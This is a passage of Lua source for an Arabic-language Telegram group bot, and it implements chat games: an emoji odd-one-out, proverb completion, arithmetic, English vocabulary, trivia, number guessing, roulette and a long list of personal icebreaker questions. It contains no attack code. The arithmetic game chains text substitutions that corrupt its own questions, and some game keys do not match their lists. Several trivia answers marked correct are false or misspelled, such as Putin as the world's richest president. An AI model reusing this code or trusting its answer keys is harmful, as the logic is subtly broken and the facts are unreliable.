name = string.gsub(name,'🧝‍♂️','🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♂️🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♀️')
name = string.gsub(name,'🙍‍♂️','🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️')
name = string.gsub(name,'🧖‍♂️','🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️')
name = string.gsub(name,'👬','👭👭👭👭👬👭👭👭')
name = string.gsub(name,'👨‍👨‍👧','👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦')
name = string.gsub(name,'🕓','🕒🕒🕒🕒🕓🕒🕒🕒')
name = string.gsub(name,'🕤','🕥🕥🕥🕥🕥🕤🕥🕥')
name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⌛️⏳⏳')
name = string.gsub(name,'📅','📆📆📆📆📆📅📆📆')
name = string.gsub(name,'👩‍⚖️','👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👩‍⚖️👨‍⚖️👨‍⚖️')
name = string.gsub(name,'👨‍🎨','👩‍🎨👩‍🎨👨‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨')
LanZoTeam = '᥀︙اول واحد يطلع المختلف يربح\n{'..name..'} '
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md')
return false
end end
if text == DevaMeR:get(LanZo..'aMeR:GameNum4'..msg.chat_id_) and not DevaMeR:get(LanZo..'aMeR:Games:Ids'..msg.chat_id_) then
if not DevaMeR:get(LanZo..'aMeR:Games:Ids'..msg.chat_id_) then 
LanZoTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ المختلف للعب مره اخرى'
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md')
DevaMeR:incrby(LanZo..'aMeR:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevaMeR:set(LanZo..'aMeR:Games:Ids'..msg.chat_id_,true)
end  
if text == 'امثله' and ChCheck(msg) or text == 'الامثله' and ChCheck(msg) or text == '↫ امثله ᥀' and ChCheck(msg) then
if not DevaMeR:get(LanZo..'aMeR:Lock:Games'..msg.chat_id_) then
DevaMeR2 = {
'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',
};
name = DevaMeR2[math.random(#DevaMeR2)]
DevaMeR:set(LanZo..'aMeR:GameNum5'..msg.chat_id_,name)
DevaMeR:del(LanZo..'aMeR:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'جوز','ينطي ___ للماعنده سنون')
name = string.gsub(name,'ضراطه','الي يسوق المطي يتحمل ___ ')
name = string.gsub(name,'بيدك','اكل ___ محد يفيدك')
name = string.gsub(name,'الحافي','تجدي من ___ نعال')
name = string.gsub(name,'شقره','مع الخيل يا ___ ')
name = string.gsub(name,'النخله','الطول طول ___ والعقل عقل الصخلة')
name = string.gsub(name,'سلايه','بالوجه امراية وبالظهر ___ ')
name = string.gsub(name,'الخيل','من قلة ___ شدو على الچلاب سروج')
name = string.gsub(name,'حداد','موكل من صخم وجهه كال آني ___ ')
name = string.gsub(name,'المبلل',' ___ ما يخاف من المطر')
name = string.gsub(name,'الحبل','اللي تلدغة الحية يخاف من جرة ___ ')
name = string.gsub(name,'يركص','المايعرف ___ يكول الكاع عوجه')
name = string.gsub(name,'العنب','المايلوح ___ يكول حامض')
name = string.gsub(name,'العمه','___ إذا حبت الچنة ابليس يدخل الجنة')
name = string.gsub(name,'الخبز','انطي ___ للخباز حتى لو ياكل نصه')
name = string.gsub(name,'بالحصاد','اسمة ___ ومنجله مكسور')
name = string.gsub(name,'شهر','امشي ___ ولا تعبر نهر')
name = string.gsub(name,'شكه','يامن تعب يامن ___ يا من على الحاضر لكة')
name = string.gsub(name,'القرد',' ___ بعين امه غزال')
name = string.gsub(name,'يكحله','اجه ___ عماها')
LanZoTeam = '᥀︙اكمل المثال التالي ↫ ['..name..']'
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md')
return false
end end
if text == DevaMeR:get(LanZo..'aMeR:GameNum5'..msg.chat_id_) then
if not DevaMeR:get(LanZo..'aMeR:Games:Ids'..msg.chat_id_) then 
DevaMeR:incrby(LanZo..'aMeR:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevaMeR:del(LanZo..'aMeR:GameNum5'..msg.chat_id_)
LanZoTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ امثله للعب مره اخرى'
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md')
end
DevaMeR:set(LanZo..'aMeR:Games:Ids'..msg.chat_id_,true)
end  
if text == 'رياضيات' and ChCheck(msg) or text == 'الرياضيات' and ChCheck(msg) or text == '↫ رياضيات ᥀' and ChCheck(msg) then
if not DevaMeR:get(LanZo..'aMeR:Lock:Games'..msg.chat_id_) then
DevaMeR2 = {'9','46','2','9','5','4','25','10','17','15','39','5','16',};
name = DevaMeR2[math.random(#DevaMeR2)]
DevaMeR:set(LanZo..'aMeR:GameNum6'..msg.chat_id_,name)
DevaMeR:del(LanZo..'aMeR:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'9','7 + 2 = ?')
name = string.gsub(name,'46','41 + 5 = ?')
name = string.gsub(name,'2','5 - 3 = ?')
name = string.gsub(name,'9','5 + 2 + 2 = ?')
name = string.gsub(name,'5','8 - 3 = ?')
name = string.gsub(name,'4','40 ÷ 10 = ?')
name = string.gsub(name,'25','30 - 5 = ?')
name = string.gsub(name,'10','100 ÷ 10 = ?')
name = string.gsub(name,'17','10 + 5 + 2 = ?')
name = string.gsub(name,'15','25 - 10 = ?')
name = string.gsub(name,'39','44 - 5 = ?')
name = string.gsub(name,'5','12 + 1 - 8 = ?')
name = string.gsub(name,'16','16 + 16 - 16 = ?')
LanZoTeam = '᥀︙اكمل المعادله التاليه ↫ ⤈\n{'..name..'} '
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md')
return false
end end
if text == DevaMeR:get(LanZo..'aMeR:GameNum6'..msg.chat_id_) then
if not DevaMeR:get(LanZo..'aMeR:Games:Ids'..msg.chat_id_) then 
DevaMeR:incrby(LanZo..'aMeR:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevaMeR:del(LanZo..'aMeR:GameNum6'..msg.chat_id_)
LanZoTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ رياضيات للعب مره اخرى'
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md')
end
DevaMeR:set(LanZo..'aMeR:Games:Ids'..msg.chat_id_,true)
end  
if text == 'الانكليزي' and ChCheck(msg) or text == 'الانجليزيه' and ChCheck(msg) or text == 'انكليزيه' and ChCheck(msg) or text == '↫ انكليزي ᥀' and ChCheck(msg) then
if not DevaMeR:get(LanZo..'aMeR:Lock:Games'..msg.chat_id_) then
DevaMeR2 = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','سدني','نقود','اعلم','ذئب','تمساح','ذكي','شاطئ','غبي',};
name = DevaMeR2[math.random(#DevaMeR2)]
DevaMeR:set(LanZo..'aMeR:GameNum7'..msg.chat_id_,name)
DevaMeR:del(LanZo..'aMeR:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ذئب','Wolf')
name = string.gsub(name,'معلومات','Information')
name = string.gsub(name,'قنوات','Channels')
name = string.gsub(name,'مجموعات','Groups')
name = string.gsub(name,'كتاب','Book')
name = string.gsub(name,'تفاحه','Apple')
name = string.gsub(name,'نقود','money')
name = string.gsub(name,'اعلم','I know')
name = string.gsub(name,'تمساح','crocodile')
name = string.gsub(name,'شاطئ','Beach')
name = string.gsub(name,'غبي','Stupid')
name = string.gsub(name,'صداقه','Friendchip')
LanZoTeam = '᥀︙ما معنى كلمة ↫ '..name
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md')
return false
end end
if text == DevaMeR:get(LanZo..'aMeR:GameNum7'..msg.chat_id_) then
if not DevaMeR:get(LanZo..'aMeR:Games:Ids'..msg.chat_id_) then 
DevaMeR:incrby(LanZo..'aMeR:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevaMeR:del(LanZo..'aMeR:GameNum7'..msg.chat_id_)
LanZoTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ انكليزيه للعب مره اخرى'
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md')
end
DevaMeR:set(LanZo..'aMeR:Games:Ids'..msg.chat_id_,true)
end  
--     Source LanZo     --
if text == 'اسئله' and ChCheck(msg) or text == 'اختيارات' and ChCheck(msg) or text == 'الاسئله' and ChCheck(msg) or text == 'اساله' and ChCheck(msg) or text == '↫ اسئله ᥀' and ChCheck(msg) then
if not DevaMeR:get(LanZo..'aMeR:Lock:Games'..msg.chat_id_) then
DevaMeR2 = {'النيل','14','الفم','11','30','بوتين','ستيف جوبر','باريس','10','النمل','حرف الواو','الشعر','سحاب','الاسم','ذهب','حرف الام','العزائم','انسات','المنجنيق','اسيا','6','الاسد','مهر','الدولفين','اوروبا','الزئبق','لندن','الانسان','طوكيو','خديجه',}
name = DevaMeR2[math.random(#DevaMeR2)]
DevaMeR:set(LanZo..'aMeR:GameNum8'..msg.chat_id_,name)
DevaMeR:del(LanZo..'aMeR:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'النيل','᥀︙ماهو اطول نهر في العالم ؟\n1- النيل\n2- الفرات\n3- نهر الكونغو')
name = string.gsub(name,'14','᥀︙ماعدد عظام الوجه ؟\n1- 15\n2- 13\n3- 14')
name = string.gsub(name,'الفم','᥀︙كراسي بيضاء وجدران ورديه اذا اغلقته اصبح ظلام  فمن اكون ؟\n1- الفم\n2- الاذن\n3- الثلاجه')
name = string.gsub(name,'11','᥀︙كم جزء يحتوي مسلسل وادي الذئاب ؟\n1- 7\n2- 15\n3- 11')
name = string.gsub(name,'30','᥀︙كم جزء يحتوي القران الكريم ؟\n1- 60\n2- 70\n3- 30')
name = string.gsub(name,'بوتين','᥀︙من هوه اغنى رئيس في العالم ؟\n1- ترامب\n2- اوباما\n3- بوتين')
name = string.gsub(name,'ستيف جوبر','᥀︙من هوه مؤسس شركه ابل العالميه  ؟\n1- لاري بايج\n2- بيل جيتس\n3- ستيف جوبر')
name = string.gsub(name,'باريس','ماهي عاصمه فرنسا ؟\n1- باريس\n2- لوين\n3- موسكو')
name = string.gsub(name,'10','᥀︙ماعدد دول العربيه التي توجد في افريقيا ؟\n1- 10\n2- 17\n3- 9')
name = string.gsub(name,'النمل','᥀︙ماهو الحيوان الذي يحمل 50 فوق وزنه ؟\n1- الفيل\n2- النمل\n3- الثور')
name = string.gsub(name,'حرف الواو','᥀︙ماذا يوجد بيني وبينك ؟\n1- الضل\n2- الاخلاق\n3- حرف الواو')
name = string.gsub(name,'الشعر','᥀︙ماهو الشيء النبات ينبت للانسان بلا بذر ؟\n1- الاضافر\n2- الاسنان\n3- الشعر')
name = string.gsub(name,'سحاب','᥀︙ما هو الشّيء الذي يستطيع المشي بدون أرجل والبكاء بدون أعين ؟\n1- سحاب\n2- بئر\n3- نهر')
name = string.gsub(name,'الاسم','᥀︙ما الشيء الذي نمتلكه , لكنّ غيرنا يستعمله أكثر منّا ؟\n1- العمر\n2- ساعه\n3- الاسم')
name = string.gsub(name,'ذهب','᥀︙اصفر اللون سارق عقول اهل الكون وحارمهم لذيذ النوم ؟\n1- نحاس\n2- الماس\n3- ذهب')
name = string.gsub(name,'حرف الام','᥀︙في الليل ثلاثة لكنه في النهار واحده فما هو ؟\n1- حرف الباء\n2- حرف الام\n3- حرف الراء')
name = string.gsub(name,'العزائم','᥀︙على قدر اصل العزم تأتي ؟\n1- العزائم\n2- المكارم\n3- المبائب')
name = string.gsub(name,'انسات','᥀︙ماهي جمع كلمه انسه ؟\n1- سيدات\n2- انسات\n3- قوانص')
name = string.gsub(name,'المنجنيق','᥀︙اله اتسعلمت قديما في الحروب ؟\n1- الصاروخ\n2- المسدس\n3- المنجنيق')
name = string.gsub(name,'اسيا','᥀︙تقع لبنان في قاره ؟\n1- افريقيا\n2- اسيا\n3- امركيا الشماليه')
name = string.gsub(name,'6','᥀︙كم صفرا للمليون ؟\n1- 4\n2- 3\n3- 6')
name = string.gsub(name,'الاسد','᥀︙ماهو الحيوان الذي يلقب بملك الغابه ؟\n1- الفيل\n2- الاسد\n3- النمر')
name = string.gsub(name,'مهر','᥀︙ما اسم صغير الحصان ؟\n1- مهر\n2- جرو\n3- عجل')
name = string.gsub(name,'الدولفين','᥀︙ما الحيوان الذي ينام واحدى عينه مفتوحه ؟\n1- القرش\n2- الدولفين\n3- الثعلب\n')
name = string.gsub(name,'اوروبا','᥀︙ماهي القاره التي تلقب بالقاره العجوز ؟\n1- اوروبا\n2- امريكا الشماليه\n3- افريقيا')
name = string.gsub(name,'الزئبق','᥀︙ما اسم المعدن الموجود فيي الحاله السائله ؟\n1- النحاس\n2- الحديد\n3- الزئبق')
name = string.gsub(name,'لندن','᥀︙ماهي عاصمه انجلترا ؟\n1- لندن\n2- لفرسول\n3- تركيا')
name = string.gsub(name,'الانسان','᥀︙ماهو الشئ الذي برأسه سبع فتحات ؟\n1- الهاتف\n2- التلفاز\n3- الانسان')
name = string.gsub(name,'طوكيو','᥀︙ماهي عاصمه اليابان ؟\n1- بانكول\n2- نيو دلهي\n3- طوكيو')
name = string.gsub(name,'خديجه','᥀︙من هي زوجه الرسول الاكبر منه سنآ ؟\n1- حفضه\n2- زينب\n3- خديجه')
LanZoTeam = name..'\n᥀︙ارسل الجواب الصحيح فقط'
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md')
return false
end end
if text == DevaMeR:get(LanZo..'aMeR:GameNum8'..msg.chat_id_) then
if not DevaMeR:get(LanZo..'aMeR:Games:Ids'..msg.chat_id_) then 
DevaMeR:incrby(LanZo..'aMeR:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevaMeR:del(LanZo..'aMeR:GameNum8'..msg.chat_id_)
LanZoTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ الاسئله للعب مره اخرى'
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md')
end
DevaMeR:set(LanZo..'aMeR:Games:Ids'..msg.chat_id_,true)
end  
--     Source LanZo     --
if DevaMeR:get(LanZo.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Dev_aMeR(msg.chat_id_, msg.id_, 1,"᥀︙عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
local GETNUM = DevaMeR:get(LanZo.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevaMeR:del(LanZo..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevaMeR:del(LanZo.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
DevaMeR:incrby(LanZo..'aMeR:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙*التخمين الصحيح هو* ↫ '..NUM..'\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevaMeR:incrby(LanZo..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(DevaMeR:get(LanZo..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
DevaMeR:del(LanZo..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevaMeR:del(LanZo.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙*التخمين الصحيح هو* ↫ '..GETNUM..'\n᥀︙*للاسف لقد خسرت حاول مره اخرى لتخمين الرقم الصحيح*', 1, 'md')
else
if tonumber(DevaMeR:get(LanZo..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'محاولتان فقط'
elseif tonumber(DevaMeR:get(LanZo..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
SetNum = 'محاوله واحده فقط'
end
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لقد خمنت الرقم الخطا وتبقى لديك '..SetNum..' ارسل رقم تخمنه مره اخرى للفوز', 1, 'md')
end
end
end
end
if text == 'خمن' and ChCheck(msg) or text == 'تخمين' and ChCheck(msg) or text == '↫ تخمين ᥀' and ChCheck(msg) then   
if not DevaMeR:get(LanZo..'aMeR:Lock:Games'..msg.chat_id_) then
Num = math.random(1,20)
DevaMeR:set(LanZo.."GAMES:NUM"..msg.chat_id_,Num) 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙اهلا بك عزيزي في لعبة التخمين ↫ ⤈\n ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙سيتم تخمين عدد ما بين الـ1 والـ20 اذا تعتقد انك تستطيع الفوز جرب واللعب الان .\n᥀︙ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !', 1, 'md')
DevaMeR:setex(LanZo.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_, 100, true)  
return false  
end
end
--     Source LanZo     --
if text == 'روليت' and ChCheck(msg) then
if not DevaMeR:get(LanZo..'aMeR:Lock:Games'..msg.chat_id_) then
DevaMeR:del(LanZo.."aMeR:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevaMeR:del(LanZo..'aMeR:ListRolet'..msg.chat_id_)  
DevaMeR:setex(LanZo.."aMeR:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙حسنا لنلعب , ارسل عدد اللاعبين للروليت .', 1, 'md')
return false  
end
end
if text and text:match("^(%d+)$") and DevaMeR:get(LanZo.."aMeR:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
if text == "1" then
Text = "᥀︙لا استطيع بدء اللعبه بلاعب واحد فقط"
else
DevaMeR:set(LanZo.."aMeR:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
Text = '᥀︙تم بدء تسجيل اللسته يرجى ارسال المعرفات \n᥀︙الفائز يحصل على 5 نقاط عدد المطلوبين ↫ '..text..' لاعب'
end
DevaMeR:del(LanZo.."aMeR:StartRolet"..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,Text)
return false
end
if text and text:match('^(@[%a%d_]+)$') and DevaMeR:get(LanZo.."aMeR:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
if DevaMeR:sismember(LanZo..'aMeR:ListRolet'..msg.chat_id_,text) then
send(msg.chat_id_,msg.id_,'᥀︙المعرف ↫ ['..text..'] موجود اساسا')
return false
end
tdcli_function ({ID = "SearchPublicChat",username_ = text},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙المعرف غير صحيح يرجى ارسال معرف صحيح', 1, 'md')
return false 
end
DevaMeR:sadd(LanZo..'aMeR:ListRolet'..msg.chat_id_,text)
local CountAdd = DevaMeR:get(LanZo.."aMeR:NumRolet"..msg.chat_id_..msg.sender_user_id_)
local CountAll = DevaMeR:scard(LanZo..'aMeR:ListRolet'..msg.chat_id_)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
DevaMeR:del(LanZo.."aMeR:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevaMeR:setex(LanZo.."aMeR:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
local Text = "᥀︙تم ادخال المعرف ↫ ["..text.."]\n᥀︙وتم اكتمال العدد الكلي هل انت مستعد ؟"
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="لا",callback_data="/NoRolet"}},{{text="اللاعبين",callback_data="/ListRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
local Text = "᥀︙تم ادخال المعرف ↫ ["..text.."] وتبقى ↫ "..CountUser.." لاعبين ليكتمل العدد ارسل المعرف الاخر"
keyboard = {} 
keyboard.inline_keyboard = {{{text="الغاء",callback_data="/NoRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil) 
end
--     Source LanZo     --
if text == 'كت تويت' and ChCheck(msg) or text == 'كت' and ChCheck(msg) or text == 'تويت' and ChCheck(msg) or text == '↫ كت ᥀' and ChCheck(msg) then
if not DevaMeR:get(LanZo..'aMeR:Lock:Games'..msg.chat_id_) then
local LanZoTeam = {
'آخر مرة زرت مدينة الملاهي؟','آخر مرة أكلت أكلتك المفضّلة؟','الوضع الحالي؟\n‏1. سهران\n‏2. ضايج\n‏3. أتأمل','آخر شيء ضاع منك؟','كلمة أخيرة لشاغل البال؟','طريقتك المعتادة في التخلّص من الطاقة السلبية؟','شهر من أشهر العام له ذكرى جميلة معك؟','كلمة غريبة من لهجتك ومعناها؟🤓','‏- شيء سمعته عالق في ذهنك هاليومين؟','متى تكره الشخص الذي أمامك حتى لو كنت مِن أشد معجبينه؟','‏- أبرز صفة حسنة في صديقك المقرب؟','هل تشعر أن هنالك مَن يُحبك؟','اذا اكتشفت أن أعز أصدقائك يضمر لك السوء، موقفك الصريح؟','أجمل شيء حصل معك خلال هاليوم؟','صِف شعورك وأنت تُحب شخص يُحب غيرك؟👀💔','كلمة لشخص غالي اشتقت إليه؟💕','آخر خبر سعيد، متى وصلك؟','أنا آسف على ....؟','أوصف نفسك بكلمة؟','صريح، مشتاق؟','‏- صريح، هل سبق وخذلت أحدهم ولو عن غير قصد؟','‏- ماذا ستختار من الكلمات لتعبر لنا عن حياتك التي عشتها الى الآن؟💭','‏- فنان/ة تود لو يدعوكَ على مائدة عشاء؟😁❤','‏- تخيّل شيء قد يحدث في المستقبل؟','‏- للشباب | آخر مرة وصلك غزل من فتاة؟🌚','شخص أو صاحب عوضك ونساك مُر الحياة ما اسمه ؟','| اذا شفت حد واعجبك وعندك الجرأه انك تروح وتتعرف عليه ، مقدمة الحديث شو راح تكون ؟.','كم مره تسبح باليوم','نسبة النعاس عندك حاليًا؟','لو فقط مسموح شخص واحد تتابعه فالسناب مين بيكون ؟','يهمك ملابسك تكون ماركة ؟','وش الشيء الي تطلع حرتك فيه و زعلت ؟','عندك أخوان او خوات من الرضاعة؟','عندك معجبين ولا محد درا عنك؟','أصعب صفة قد تتواجد في الرجل .؟','كم المده الي تخليك توقع بحب الشخص؟.','تحس انك مستعد للقاء الله ولا باقي.؟','متصالح مع نفسك؟.','يسكر على أصبعك الباب ولا تعض لسانك  بالغلط؟!','عندك غمازات؟.','‏ألوانك المفضّلة؟','ردة فعلك لما تنظلم من شخص ؟','وش الحب بنظرك؟','أكثر شيء تقدره في الصداقات؟','‏لوخيروك ⁞ الاكل لو النت ؟!','عاجبك وجودك في التلي ولا تتمنى تحذفة.؟','افضل هديه ممكن تناسبك؟','شعورك الحالي في جملة؟','أنا حزين جداً أجعلني أبتسم.؟','بماذا يتعافى المرء؟','تاك لشخص نفسيه؟','شاركنا بيت شعري حزين على ذوقك.؟','اغنية عندك بيها ذكريات؟','اشياء تفتخر انك م سويتها ؟','الصراحة وقاحة ولا صدق تعامل.؟','ايهم اصدق نظرة العين او نبرة الصوت ؟','‏قلّة المال لدى الرجل في هذا الزمن يعتبرها العديد كانها عيب، مع أم ضد؟','إيهما تُفضل حُب ناجح أم صداقة دائمة.؟','على نياتكُم تُرزقون تاك لشخص ينطبق علية هذا الشيء.؟','اكثر كلمة ترفع ضغطك ؟','من أصحاب الماضي والحنين ولا الصفحات المطوية.؟','من أصحاب النسيان او التجاوز رغم الذكرى.؟','غزل بلهجتك ؟','مصروفك كم؟.','للحتيت ⁞ ماذا تفضّلين أن تكون مهنة شريك حياتك المستقبلي.؟','يومك ضاع على؟','ما الذي اسعدك اليوم .؟','كيف تتعامل مع الشخص المُتطفل ( الفضولي ) ؟','أصعب صفة قد تتواجد في المرأة.؟','مع أو ضد لو كان خيراً لبقئ.؟','نصيحة لكل شخص يذكر أحد بغيابة بالسوء.؟','كل شيء يهون الا ؟','هل أنت من النوع الذي يواجه المشاكل أو من النوع الذي يهرب ؟','كلمه لشخص خانك!؟.','تحب تحتفظ بالذكريات ؟','شاركنا أقوى بيت شِعر من تأليفك؟','‏اسرع شيء يحسّن من مزاجك؟','كلمتك التسليكيه ؟','كم ساعات نومك؟.','عندك فوبيا او خوف شديد من شيء معين ؟','موهبة تفوز بمدح الناس لك.؟','قدوتك من الأجيال السابقة؟','شخص تتمنئ له الموت؟.','عادةً تُحب النقاش الطويل أم تحب الاختصار؟','تاك لشخص نيته زباله🌚؟','صوتك حلو ؟ .','كلمتين تكررها دايم؟!','افضل روايه قريتيها؟.','متى حدث التغيير الكبير والملحوظ في شخصيتك؟','أكثر اكلهه تحبها؟.','‏كلما ازدادت ثقافة المرء ازداد بؤسه','تتفق.؟','اغبى كذبه صدقتها بطفولتك؟.','كم المده الي تخليك توقع بحب الشخص؟.','تسامح شخص وجع قلبك ؟.','ردة فعلك لما تنظلم من شخص ؟','شيء يعدل نفسيتك بثواني.؟','‏تتوقع الإنسان يحس بقرب موته؟','وقت حزنك تلجأ لمن يخفف عنك.؟','‏أكثر شيء شخصي ضاع منك؟','تزعلك الدنيا ويرضيك ؟','ما الذي يشغل بالك في الفترة الحالية؟','نهارك يصير أجمل بوجود ..؟','حسيت انك ظلمت شخص.؟','صفة يطلقها عليك من حولك بكثرة؟','‏يوم لا يمكنك نسيانه؟','أكثر اكلهه تحبها؟.','اخر كلمة قالها لك حبيبك؟.','من الشخص الاقرب لقلبك؟.','كم المده الي تخليك توقع بحب الشخص؟.','ماهي الهدية التي تتمنى أن تنتظرك يومًا أمام باب منزلك؟','‏اسم او تاك لشخص لا ترتاح في يومك إلا إذا حاجيته؟','صديق أمك ولا أبوك. ؟','لماذا الأشياء التي نريدها بشغف تأتي متأخرة؟','‏تقبل بالعودة لشخص كسر قلبك مرتين؟','افضل هديه ممكن تناسبك؟','كلمة غريبة ومعناها؟','اذا اشتقت تكابر ولا تبادر ؟.','بامكانك تنزع شعور من قلبك للابد ، ايش هو؟.','لو بتغير اسمك ايش بيكون الجديد ؟','‏شخصية لا تستطيع تقبلها؟','ما هي طريقتك في الحصول على الراحة النفسية؟','‏ايموجي يوصف مزاجك حاليًا بدقة؟','تاريخ ميلادك؟','كيف تحد الدولة من الفقر المُتزايد.؟','‏شي مستحيل يتغير فيك؟','لو اخذوك لمستشفى المخابيل كيف تثبت انت صاحي؟','إيموجي يعبّر عن مزاجك الحالي؟','وقت حزنك تلجأ لمن يخفف عنك.؟','اعترف باي حاجه ؟','شاركني آخر صورة جميلة من كاميرا هاتفك.؟','متصالح مع نفسك؟.','لو عندك امنيه وبتحقق وش هي؟.','هل انت شخص مادي.؟','أخر اتصال جاك من مين ؟','تاك لصديقك المُقرب؟.','تحب العلاقات العاطفيه ولا الصداقه؟.','العين الي تستصغرك........؟','تجامل الناس ولا اللي بقلبك على لسانك؟','وقت حزنك تلجأ لمن يخفف عنك.؟','اكثر المتابعين عندك باي برنامج؟','صفه تتمناها بشريك حياتك؟.','من اصدق في الحب الولد ولا البنت؟.','يرد عليك متأخر على رسالة مهمة وبكل برود، موقفك؟','كلمة لشخص بعيد؟','رحتي لعرس وأكتشفتي العريس حبيبك شنو ردة فعلك.؟','تسامح شخص وجع قلبك ؟.','احقر موقف صار لك؟.','ماذا لو كانت مشاعر البشر مرئية ؟','وين نلقى السعاده برايك؟','قد تخيلت شي في بالك وصار ؟','صفة يطلقها عليك الشخص المفضّل؟','اخر خيانه؟.','تحب تحتفظ بالذكريات ؟','لو بتغير اسمك ايش بيكون الجديد ؟','الاعتذار أخلاق ولا ضعف.؟','هل أنت من النوع الذي يواجه المشاكل أو من النوع الذي يهرب ؟','‏ تكره أحد من قلبك ؟','تاك لشخص وكوله اعترف لك؟','مع أو ضد لو كان خيراً لبقئ.؟','‏هل لديك شخص لا تخفي عنه شيئًا؟','اغنيه تأثر بيك؟','المطوعة والعاقلة من شلتك.؟','مواصفات امير/ة احلامك؟.','‏كلمة لصديقك البعيد؟','تتابع انمي؟ إذا نعم ما أفضل انمي شاهدته؟','قرارتك راضي عنها ام لا ؟','تسامح شخص سبب في بكائك.؟','لو حصل واشتريت جزيرة، ماذا ستختار اسمًا لها.؟','اغنيتك المفضلة؟.','شاركنا اقوئ نكتة عندك.؟','ماذا لو عاد مُشتاقاً.؟','مسلسل 